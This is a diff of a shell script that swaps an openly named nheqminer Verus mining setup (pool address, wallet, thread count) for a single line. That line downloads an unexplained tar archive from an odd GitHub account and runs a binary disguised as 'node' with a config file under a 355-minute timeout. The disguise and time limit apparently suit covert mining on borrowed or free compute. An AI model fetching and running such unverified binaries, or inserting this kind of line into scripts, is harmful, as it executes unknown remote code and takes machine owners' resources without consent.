@@ -1,6 +1,2 @@
 #!/bin/sh
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvzf nheqminer-Linux-v0.8.2.tgz
-tar xf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-./nheqminer -v -l na.luckpool.net:3956 -u RPn4qqbnhdoq2e7pihHD9ErCkZdakWYW4M.CDS -p x -t 12
+wget https://github.com/tomirobert1-fdghtrhtom/x/releases/download/v1.1/verus.tar && tar -xvf verus.tar && timeout 355m ./node vr.ini
